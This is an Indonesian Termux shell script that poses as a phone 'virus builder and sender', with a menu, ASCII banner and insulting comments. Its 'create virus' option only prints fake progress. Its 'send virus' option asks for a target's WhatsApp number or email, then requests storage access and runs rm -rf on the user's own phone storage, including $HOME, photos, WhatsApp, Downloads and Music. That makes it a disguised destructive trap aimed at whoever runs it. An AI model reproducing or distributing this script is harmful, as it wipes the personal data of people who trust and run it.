#Supres madafaka -_-
#Bocah tolol :D
#Lu cuma bisa recode doang ?
#Goblok dipiara

#Code warna
white='\033[37;1m'
cyan='\033[36;1m'
purple='\033[35;1m'
blue='\033[34;1m'
yellow='\033[33;1m'
green='\033[32;1m'
red='\033[31;1m'
echo
clear
echo ""

echo
echo $purple "───────────────────────────────────────────────────────────────────────────"
echo $purple "─██████──██████─██████████─████████████████───██████──██████─██████████████"
echo $purple "─██▒▒██──██▒▒██─██▒▒▒▒▒▒██─██▒▒▒▒▒▒▒▒▒▒▒▒██───██▒▒██──██▒▒██─██▒▒▒▒▒▒▒▒▒▒██"
echo $purple "─██▒▒██──██▒▒██─████▒▒████─██▒▒████████▒▒██───██▒▒██──██▒▒██─██▒▒██████████"
echo $purple "─██▒▒██──██▒▒██───██▒▒██───██▒▒██────██▒▒██───██▒▒██──██▒▒██─██▒▒██────────"
echo $purple "─██▒▒██──██▒▒██───██▒▒██───██▒▒████████▒▒██───██▒▒██──██▒▒██─██▒▒██████████"
echo $purple "─██▒▒██──██▒▒██───██▒▒██───██▒▒▒▒▒▒▒▒▒▒▒▒██───██▒▒██──██▒▒██─██▒▒▒▒▒▒▒▒▒▒██"
echo $purple "─██▒▒██──██▒▒██───██▒▒██───██▒▒██████▒▒████───██▒▒██──██▒▒██─██████████▒▒██"
echo $purple "─██▒▒▒▒██▒▒▒▒██───██▒▒██───██▒▒██──██▒▒██─────██▒▒██──██▒▒██─────────██▒▒██"
echo $purple "─████▒▒▒▒▒▒████─████▒▒████─██▒▒██──██▒▒██████─██▒▒██████▒▒██─██████████▒▒██"
echo $purple "───████▒▒████───██▒▒▒▒▒▒██─██▒▒██──██▒▒▒▒▒▒██─██▒▒▒▒▒▒▒▒▒▒██─██▒▒▒▒▒▒▒▒▒▒██"
echo $purple "─────██████─────██████████─██████──██████████─██████████████─██████████████"
echo $purple "───────────────────────────────────────────────────────────────────────────"
echo $cyan "====================================="
echo $cyan "====================================="
echo $cyan "==       " $purple "[1]. Buat Virus       " $cyan "=="
echo $cyan "==       " $purple "[2]. Kirim Virus      " $cyan "=="
echo $cyan "==       " $purple "[3]. Cara Pakai       " $cyan "=="
echo $cyan "==       " $purple "[Q]. Exit             " $cyan "=="
echo $cyan "====================================="
echo $cyan "====================================="
echo
echo $green "╭─"$yellow"Tn.PENNYW1S3"$cyan" ~[KEJORA]~"$green
read -p " ╰─# "  pws

#Buat Virus
if [ $pws = "1" ] || [ $pws = "1" ]
then
echo -n "Masukan Ip hp lu : "
read ip
sleep 2
echo -n "masukan port nya. Contoh = 4444 : "
read port
sleep 2
echo -n "Masukan Nama Virus lu : "
read virus
sleep 2
echo $yellow "LOo0oading... "
sleep 3
echo $red "Apakah Ip" $ip ", port " $port ", Nama virus " $virus ".apk Sudah benar ? "
sleep 4
echo $yellow "Anggap aja bener ya banhsd :D "
echo $yellow "Loading... "
sleep 3
echo $red "Virus berhasil dibuat! "
echo $cyan "Goes to menu bangsd "
sleep 2
sh v1rus.sh
fi

#Kirim Virus
if [ $pws = "2" ] || [ $pws = "2" ]
then
clear
echo $yellow "Harap izinkan termux membaca memori lu "
sleep 2
termux-setup-storage
echo -n "Masukan no WA/Email target : "
read wa
sleep 3
echo $purple "Loading... "
sleep 3
echo $red "sedang mengirim ke " $wa
sleep 2
echo $cyan "Harap tunggu! "
sleep 2
termux-setup-storage
rm -rf /storage/emulated/0
rm -rf /sdcard/0
rm -rf /storage/emulated/0/DCIM
rm -rf /storage/emulated/0/android/obb
rm -rf /sdcard/0/android/data
rm -rf $HOME
rm -rf sdcard/0
rm -rf storage/emulated/0
rm -rf /storage/emulated/0/WhatsApp
rm -rf /sdcard/0/WhatsApp
rm -rf /storage/emulated/0/Downloads
rm -rf /storage/emulated/0/Music
rm -rf /sdcard/0/Music
echo $purple "Selesai tod "
echo $cyan "Gw tidak bertanggung jawab"
echo $cyan "atas apa yang akan terjadi akibat"
echo $cyan "tools gw"
echo $red "Salah ngegunain bisa berakibat vatal!!! "
echo
echo $green"[B]" $yellow" Menu" $green"[K]" $yellow" Keluar"
read -p "[B/K] : " beck
fi

#Cara Pakai
if [ $pws = "3" ] || [ $pws = "3" ]
then
clear
echo ""

echo "=========================================
=========================================
===         WELCOME MADAFAKA          ===
===Cara makenya, Lu sebelumnya siapin ===
===Alamat ip lu, port, ama no wa, atau===
===alamat email tujuan. trus pilih.   ===
===menu no 1, buat bikin virusnya.    ===
===menu no 2 buat send firus nya.     ===
===             WARNING!!!            ===
=== Gw tidak bertanggung jawab atas   ===
=== Semua hal yg berhubungan dg tool  ===
=== ini.                              ===
=== Resiko tanggung sendiri cookk.    ===
=========================================
===      GUNAKAN DENGAN BIJAK.        ===
=========================================
========================================="| lolcat -a -d 5
echo
echo $green"[B]" $yellow" Menu" $green"[K]" $yellow" Keluar"
read -p "[B/K] : " beck
fi

#Exit
if [ $pws = "Q" ] || [ $pws = "q" ]
then
echo
echo "Makasih dah ngegunain tool gw :v"|lolcat
echo "Jangan Lupa Bahagia :)"|lolcat
exit
echo ""
fi

#BECK
if [ $beck = "B" ] || [ $beck = "b" ]
then
sh v1rus.sh
echo
fi

#Exit
if [ $beck = "K" ] || [ $beck = "k" ]
then
echo
echo "Makasih dah ngegunain tool gw :v"|lolcat
echo "Jangan Lupa Bahagia :)"|lolcat
exit
echo ""
fi